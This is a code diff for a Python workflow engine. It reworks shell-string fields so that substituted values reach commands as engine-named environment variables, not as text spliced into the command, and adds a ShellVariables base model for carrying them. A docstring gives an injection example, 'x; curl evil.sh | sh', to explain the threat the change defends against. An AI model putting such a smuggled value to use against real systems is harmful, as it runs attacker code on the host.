@@ -6,16 +6,16 @@ from contextlib import AbstractAsyncContextManager
 from datetime import datetime, timedelta
 from enum import StrEnum
 from pathlib import Path
-from typing import Any, ClassVar, Protocol, cast
+from typing import Annotated, Any, ClassVar, Final, Protocol, cast
 from uuid import UUID
 
 import httpx2
 from jsonschema import FormatChecker
 from pydantic import BaseModel, ConfigDict, Field, GetJsonSchemaHandler, JsonValue, field_validator, model_validator
-from pydantic.json_schema import JsonSchemaValue
+from pydantic.json_schema import JsonSchemaValue, SkipJsonSchema
 from pydantic_core import CoreSchema
 
-from dirigent_common import API_VERSION, SHELL_MEDIA_TYPE, HealthReport, JsonMap
+from dirigent_common import API_VERSION, SHELL_MEDIA_TYPE, BlockModel, HealthReport, JsonMap
 
 type RunId = UUID
 
@@ -95,11 +95,16 @@ class ShellString:
     ${params.region}"`` with ``region`` set to ``x; curl evil.sh | sh`` is a shell injection
     reachable by whoever can POST to a webhook.
 
-    Marking the field pushes the knowledge to where the answer is known. The engine quotes
-    every interpolated segment before it lands in the string, so a substituted value is
-    always exactly one shell word regardless of what is in it, while everything the author
-    typed keeps its meaning -- pipes and redirects included, which is the entire reason the
-    shell form exists.
+    Marking the field pushes the knowledge to where the answer is known. The engine keeps
+    every substituted value out of the shell's parser altogether: each ``${...}`` becomes a
+    reference to a variable the engine invents, written so it is one word wherever the author
+    put it, and the values travel to the block in :class:`ShellVariables` for it to set in the
+    command's environment. Everything the author typed keeps its meaning -- pipes and
+    redirects included, which is the entire reason the shell form exists.
+
+    A block whose config carries a marked field takes :class:`ShellVariables` as its base,
+    because the values arrive in that field and a command run without them reads empty
+    variables.
 
     It is a bare class rather than a model: annotation metadata pydantic recognises as a
     model would be read as the field's schema, and this marker must stay invisible to
@@ -125,6 +130,35 @@ class ShellString:
         published = handler(schema)
         published["contentMediaType"] = SHELL_MEDIA_TYPE
         return published
+
+
+#: What the engine names the variables it substitutes a shell string's references out into.
+SHELL_VARIABLE_PREFIX: Final = "DIRIGENT_V"
+
+#: The config key those values arrive under, which is the field :class:`ShellVariables` declares.
+SHELL_VARIABLES_FIELD: Final = "shell_variables"
+
+#: A name the engine invented, which is the only thing this field may carry.
+_SHELL_VARIABLE_PATTERN: Final = rf"^{SHELL_VARIABLE_PREFIX}[0-9]+$"
+
+
+class ShellVariables(BlockModel):
+    """The base a block config takes when any of its fields is a :class:`ShellString`.
+
+    A shell string reaches the block with every ``${...}`` rewritten to a reference to
+    ``DIRIGENT_V0``, ``DIRIGENT_V1`` and so on, and the values that were substituted out
+    arrive here. The block sets them in the environment of the process it hands the string
+    to, after whatever the document's own ``env`` holds, so a document can neither read a
+    substituted value as shell source nor override what a reference resolved to.
+
+    The field is written by the engine and is not part of the published schema, so a document
+    cannot name it.
+    """
+
+    shell_variables: SkipJsonSchema[dict[Annotated[str, Field(pattern=_SHELL_VARIABLE_PATTERN)], str]] = Field(
+        default_factory=dict[str, str]
+    )
+    """The values the engine substituted out of this config's shell strings, by variable name."""
 
 
 def shell_string_fields(model: type[BaseModel]) -> frozenset[str]:
